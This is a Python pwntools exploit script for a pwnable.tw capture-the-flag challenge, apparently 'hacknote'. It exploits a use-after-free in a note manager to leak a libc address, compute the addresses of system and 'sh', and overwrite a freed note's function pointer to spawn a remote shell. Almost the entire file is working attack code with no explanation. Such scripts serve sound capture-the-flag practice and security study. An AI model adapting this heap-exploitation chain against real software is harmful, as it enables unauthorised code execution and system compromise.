#!/usr/bin/env python2

from pwn import *
from IPython import embed

e = ELF('./libc_32.so.6')
r = remote('chall.pwnable.tw', 10102)
#e = ELF('/lib/i386-linux-gnu/libc.so.6')
#r = remote('127.0.0.1', 7122)

def menu():
	r.recvuntil('choice :')

def add(sz, cnt):
	menu()
	r.send('1')
	r.recvuntil('size :')
	r.send(str(sz))
	r.recvuntil('Content :')
	r.send(cnt)

def dele(idx):
	menu()
	r.send('2')
	r.recvuntil('Index :')
	r.send(str(idx))

def prt(idx, ret=1):
	menu()
	r.send('3')
	r.recvuntil('Index :')
	r.send(str(idx))
	if ret:
		return r.recvuntil('\n----', drop=True)

n = 124
add(n, 'A'*n)
add(n, 'A'*n)
add(n, 'A'*n)
dele(0)
dele(1)
add(n, 'B')
x = prt(1)
libc_base = u32(x[:4])-0x42+0xb0 - 0x1b07b0 #- 0x2000
#one_gadget = 0x5f066
system = libc_base + e.symbols['system']
sh = libc_base + e.search('sh\x00').next()
print 'libc_base:', hex(libc_base)
print 'system:', hex(system)
print 'sh:', hex(sh)
#print 'magic:', hex(libc_base+one_gadget)

dele(2)
add(8, flat(system)+';sh\x00')
#embed()
#raw_input('@')
prt(0, 0)

r.interactive()

